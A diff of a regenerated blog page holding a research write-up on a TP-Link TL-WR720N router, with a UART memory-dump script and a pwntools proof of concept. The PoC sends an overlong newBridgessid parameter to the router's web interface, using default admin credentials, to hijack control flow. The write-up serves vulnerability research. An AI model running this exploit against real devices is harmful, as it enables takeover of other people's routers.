@@ -2,7 +2,7 @@
 <html lang="en">
 <head>
   <meta charset="utf-8" />
-  <meta name="generator" content="Hugo 0.92.2" />
+  <meta name="generator" content="Hugo 0.115.4">
 
   <meta http-equiv="X-UA-Compatible" content="IE=edge" />
   <meta name="viewport" content="width=device-width, initial-scale=1" />
@@ -202,9 +202,9 @@
     memset          memory set
     memtest         memory test
     s26_wanstatus   show wan link status
-    s26_portstatus  show s26's port status
+    s26_portstatus  show s26&#39;s port status
     ag7240DbgLevel  set ag7240 debug level
-    ethrxring       dump rx rings' info on eth
+    ethrxring       dump rx rings&#39; info on eth
     buttontest      test QSS/restoredefault button
     wlandebug       set 802.11 debug flags
     athdebug        set ath debug flags
@@ -219,64 +219,64 @@
     txpower         set tx power
 </code></pre><p>Now interestingly enough, this shell is very restricted. We can’t change files, copy files, read files, change memory, open a debugger. We can however show tasks running, and which addresses they’re running at. We also have a <code>call</code> function that allows us to call functions by function pointers, fun. However clearly the most interesting function for me, was the <code>mem</code> function. Which I spent a lot of time figuring out how worked, because it wasn’t apparent to me, since the help message was so poor, and I couldn’t find it during the reverse engineering. However when I finally got it to work I was a bit too excited, since the syntax is fairly simple:</p>
 <pre tabindex="0"><code># mem 80010000 100 
-80010000: 8F BE 00 64 03 E0 00 08 - 27 BD 00 68 3C 18 80 01 ...d.... '..h&lt;... 
-80010010: 3C 19 80 3A 27 18 00 44 - AF 38 D9 7C 3C 0E 80 01 &lt;..:'..D .8.|&lt;... 
+80010000: 8F BE 00 64 03 E0 00 08 - 27 BD 00 68 3C 18 80 01 ...d.... &#39;..h&lt;... 
+80010010: 3C 19 80 3A 27 18 00 44 - AF 38 D9 7C 3C 0E 80 01 &lt;..:&#39;..D .8.|&lt;... 
 80010020: 3C 18 80 01 3C 0F 80 3B - 25 CE 02 A8 3C 19 80 3B &lt;...&lt;..; %...&lt;..; 
-80010030: 27 18 03 6C AD EE 95 C0 - AF 38 BC 94 03 E0 00 08 '..l.... .8...... 
-80010040: 00 00 10 25 27 BD FF C0 - AF B5 00 30 AF B6 00 34 ...%'... ...0...4 
+80010030: 27 18 03 6C AD EE 95 C0 - AF 38 BC 94 03 E0 00 08 &#39;..l.... .8...... 
+80010040: 00 00 10 25 27 BD FF C0 - AF B5 00 30 AF B6 00 34 ...%&#39;... ...0...4 
 80010050: AF B7 00 38 AF BE 00 3C - AF BF 00 2C 94 9E 00 00 ...8...&lt; ...,.... 
 80010060: 94 97 00 02 33 CF 00 01 - 00 80 B0 25 11 E0 00 1C ....3... ...%....
 </code></pre><p>It’s basically just a hexdump of the memory. I tried finding an address I might want to try and jump to in memory. Specifically I just wanted a print, that I knew to work: <img src="/pictures/unkhost.png" alt="unkhost"> However I noticed that when I tried jumping to this, at this stage the address was off. It was not actually printing anything in the UART. That’s so weird I thought. After using the mem function a bit, I managed to find some strings, and looking in my code I confirmed that those were totally different addresses. Something went wrong when I made my loader, or they do something funky when they load it. Regardless I had to fix this somehow.</p>
 <h3 id="loading-without-the-loader">Loading without the loader</h3>
 <p>I knew what I had to do. I had to use this mem function to dump the memory, however I could only dump a restricted amount of bytes at a time, and the file was going to be big. That would probably take some time. So I made a script that did this over UART, using pyserial. The main functionality of the script can be seen below:</p>
-<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#00f">def</span> read_mem(self, start_addr: int, end_addr: int, interval: int) -&gt; list:
-    <span style="color:#00f">if</span> interval % 16 != 0:
-        sys.exit(<span style="color:#a31515">&#34;Sorry, interval must be divisible by 16 for now&#34;</span>)
-
-    print(<span style="color:#a31515">f</span><span style="color:#a31515">&#34;[!] Reading from </span><span style="color:#a31515">{</span>start_addr<span style="color:#a31515">:</span><span style="color:#a31515">#x</span><span style="color:#a31515">}</span><span style="color:#a31515"> to </span><span style="color:#a31515">{</span>end_addr<span style="color:#a31515">:</span><span style="color:#a31515">#x</span><span style="color:#a31515">}</span><span style="color:#a31515"> - interval of </span><span style="color:#a31515">{</span>interval<span style="color:#a31515">:</span><span style="color:#a31515">#x</span><span style="color:#a31515">}</span><span style="color:#a31515">&#34;</span>)
-    data_arr = []
-
-    <span style="color:#00f">for</span> byte_vals <span style="color:#00f">in</span> tqdm(range(start_addr, end_addr, interval)):
-        self.uart.write(<span style="color:#a31515">f</span><span style="color:#a31515">&#34;mem </span><span style="color:#a31515">{</span>byte_vals<span style="color:#a31515">:</span><span style="color:#a31515">#x</span><span style="color:#a31515">}</span><span style="color:#a31515"> </span><span style="color:#a31515">{</span>interval<span style="color:#a31515">}</span><span style="color:#a31515">\r</span><span style="color:#a31515">&#34;</span>.encode())
-
-        <span style="color:#008000"># Remove the command</span>
-        self.uart.readlines(1)
-
-        <span style="color:#00f">for</span> _ <span style="color:#00f">in</span> range(interval//16):
-            read_values = self.uart.readlines(1)[0]
-
-            <span style="color:#008000"># Format data properly</span>
-            data = read_values[11:-24]
-            data = data.replace(<span style="color:#a31515">b</span><span style="color:#a31515">&#34;- &#34;</span>, <span style="color:#a31515">b</span><span style="color:#a31515">&#34;&#34;</span>)
-            data = data.split(<span style="color:#a31515">b</span><span style="color:#a31515">&#34; &#34;</span>)
-
-            <span style="color:#00f">for</span> val <span style="color:#00f">in</span> data:
-                data_arr.append(bytes([int(val, 16)]))
-
-    <span style="color:#00f">return</span> data_arr
-</code></pre></div><p>The entire script can be found on my <a href="https://github.com/cavetownie">Github</a>. It’s very primitive, so will probably only work on some specific TP-Link routers, that format data the same way. Otherwise you can change the way the data is formatted yourself. After running the script for 35 minutes, we finally have a new firmware file. <img src="/pictures/dumping_over_uart.png.png" alt=""> Finally we can try making a small POC script to exploit this:</p>
-<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-python" data-lang="python"><span style="color:#008000">###</span>
-<span style="color:#008000"># PoC - RCE (TP-LINK WR720N)</span>
-<span style="color:#008000">### </span>
-<span style="color:#00f">from</span> pwn <span style="color:#00f">import</span> *
-
-io = remote(<span style="color:#a31515">&#34;192.168.0.1&#34;</span>, 80)
-
-<span style="color:#00f">def</span> pp(x):
-    <span style="color:#00f">return</span> p32(x, endian=<span style="color:#a31515">&#34;big&#34;</span>)
-
-print_ping = pp(0x800cd490)
-
-task = print_ping
-
-req = <span style="color:#a31515">b</span><span style="color:#a31515">&#34;&#34;&#34;GET /userRpm/WlanNetworkRpm.htm?newBridgessid=&#34;&#34;&#34;</span>+<span style="color:#a31515">b</span><span style="color:#a31515">&#34;i&#34;</span>*732+task+<span style="color:#a31515">b</span><span style="color:#a31515">&#34;&#34;&#34;&amp;Save=Save HTTP/1.1</span><span style="color:#a31515">\r</span><span style="color:#a31515">
-</span><span style="color:#a31515">Host: 192.168.0.1</span><span style="color:#a31515">\r</span><span style="color:#a31515">
-</span><span style="color:#a31515">Authorization: Basic YWRtaW46YWRtaW4=</span><span style="color:#a31515">\r</span><span style="color:#a31515">
-</span><span style="color:#a31515">Connection: close</span><span style="color:#a31515">\r\n\r\n</span><span style="color:#a31515">&#34;&#34;&#34;</span>
-
-io.send(req)
-io.interactive()
-</code></pre></div><p>Crossing our fingers, we do hope that it works this time, and that we don’t get some “Stack smashing detected” message. So did it work this time?? <img src="/pictures/rop_poc.png.png" alt=""></p>
+<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#00f">def</span> read_mem(self, start_addr: int, end_addr: int, interval: int) -&gt; list:
+</span></span><span style="display:flex;"><span>    <span style="color:#00f">if</span> interval % 16 != 0:
+</span></span><span style="display:flex;"><span>        sys.exit(<span style="color:#a31515">&#34;Sorry, interval must be divisible by 16 for now&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    print(<span style="color:#a31515">f</span><span style="color:#a31515">&#34;[!] Reading from </span><span style="color:#a31515">{</span>start_addr<span style="color:#a31515">:</span><span style="color:#a31515">#x</span><span style="color:#a31515">}</span><span style="color:#a31515"> to </span><span style="color:#a31515">{</span>end_addr<span style="color:#a31515">:</span><span style="color:#a31515">#x</span><span style="color:#a31515">}</span><span style="color:#a31515"> - interval of </span><span style="color:#a31515">{</span>interval<span style="color:#a31515">:</span><span style="color:#a31515">#x</span><span style="color:#a31515">}</span><span style="color:#a31515">&#34;</span>)
+</span></span><span style="display:flex;"><span>    data_arr = []
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#00f">for</span> byte_vals <span style="color:#00f">in</span> tqdm(range(start_addr, end_addr, interval)):
+</span></span><span style="display:flex;"><span>        self.uart.write(<span style="color:#a31515">f</span><span style="color:#a31515">&#34;mem </span><span style="color:#a31515">{</span>byte_vals<span style="color:#a31515">:</span><span style="color:#a31515">#x</span><span style="color:#a31515">}</span><span style="color:#a31515"> </span><span style="color:#a31515">{</span>interval<span style="color:#a31515">}</span><span style="color:#a31515">\r</span><span style="color:#a31515">&#34;</span>.encode())
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#008000"># Remove the command</span>
+</span></span><span style="display:flex;"><span>        self.uart.readlines(1)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>        <span style="color:#00f">for</span> _ <span style="color:#00f">in</span> range(interval//16):
+</span></span><span style="display:flex;"><span>            read_values = self.uart.readlines(1)[0]
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>            <span style="color:#008000"># Format data properly</span>
+</span></span><span style="display:flex;"><span>            data = read_values[11:-24]
+</span></span><span style="display:flex;"><span>            data = data.replace(<span style="color:#a31515">b</span><span style="color:#a31515">&#34;- &#34;</span>, <span style="color:#a31515">b</span><span style="color:#a31515">&#34;&#34;</span>)
+</span></span><span style="display:flex;"><span>            data = data.split(<span style="color:#a31515">b</span><span style="color:#a31515">&#34; &#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>            <span style="color:#00f">for</span> val <span style="color:#00f">in</span> data:
+</span></span><span style="display:flex;"><span>                data_arr.append(bytes([int(val, 16)]))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#00f">return</span> data_arr
+</span></span></code></pre></div><p>The entire script can be found on my <a href="https://github.com/cavetownie">Github</a>. It’s very primitive, so will probably only work on some specific TP-Link routers, that format data the same way. Otherwise you can change the way the data is formatted yourself. After running the script for 35 minutes, we finally have a new firmware file. <img src="/pictures/dumping_over_uart.png.png" alt=""> Finally we can try making a small POC script to exploit this:</p>
+<div class="highlight"><pre tabindex="0" style="background-color:#fff;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#008000">###</span>
+</span></span><span style="display:flex;"><span><span style="color:#008000"># PoC - RCE (TP-LINK WR720N)</span>
+</span></span><span style="display:flex;"><span><span style="color:#008000">### </span>
+</span></span><span style="display:flex;"><span><span style="color:#00f">from</span> pwn <span style="color:#00f">import</span> *
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>io = remote(<span style="color:#a31515">&#34;192.168.0.1&#34;</span>, 80)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#00f">def</span> pp(x):
+</span></span><span style="display:flex;"><span>    <span style="color:#00f">return</span> p32(x, endian=<span style="color:#a31515">&#34;big&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>print_ping = pp(0x800cd490)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>task = print_ping
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>req = <span style="color:#a31515">b</span><span style="color:#a31515">&#34;&#34;&#34;GET /userRpm/WlanNetworkRpm.htm?newBridgessid=&#34;&#34;&#34;</span>+<span style="color:#a31515">b</span><span style="color:#a31515">&#34;i&#34;</span>*732+task+<span style="color:#a31515">b</span><span style="color:#a31515">&#34;&#34;&#34;&amp;Save=Save HTTP/1.1</span><span style="color:#a31515">\r</span><span style="color:#a31515">
+</span></span></span><span style="display:flex;"><span><span style="color:#a31515">Host: 192.168.0.1</span><span style="color:#a31515">\r</span><span style="color:#a31515">
+</span></span></span><span style="display:flex;"><span><span style="color:#a31515">Authorization: Basic YWRtaW46YWRtaW4=</span><span style="color:#a31515">\r</span><span style="color:#a31515">
+</span></span></span><span style="display:flex;"><span><span style="color:#a31515">Connection: close</span><span style="color:#a31515">\r\n\r\n</span><span style="color:#a31515">&#34;&#34;&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>io.send(req)
+</span></span><span style="display:flex;"><span>io.interactive()
+</span></span></code></pre></div><p>Crossing our fingers, we do hope that it works this time, and that we don’t get some “Stack smashing detected” message. So did it work this time?? <img src="/pictures/rop_poc.png.png" alt=""></p>
 <p>Now we have ROP. An attacker just needs a good idea, some way to do process continuation, and he could do lots of evil stuff. With enough time and investment in making an exploit, one could probably access the restricted development VxWorks shell, which gives more options. Sadly I had no idea of how to actually leverage this exploit to something useful. An attacker could also try to change the DNS settings. There are some restrictions, since the payload is sent over HTTP. For example an attacker can not send too much data, because the large size will make the request return Entity Too Large. Furthermore there’s also bad characters now, like nullbytes, newlines, and such - due to the way the HTTP protocol is structured.</p>
 <h3 id="resources">Resources</h3>
 <p>[0]: <a href="http://en.techinfodepot.shoutwiki.com/wiki/TP-LINK_TL-WR720N_v2">http://en.techinfodepot.shoutwiki.com/wiki/TP-LINK_TL-WR720N_v2</a><br>
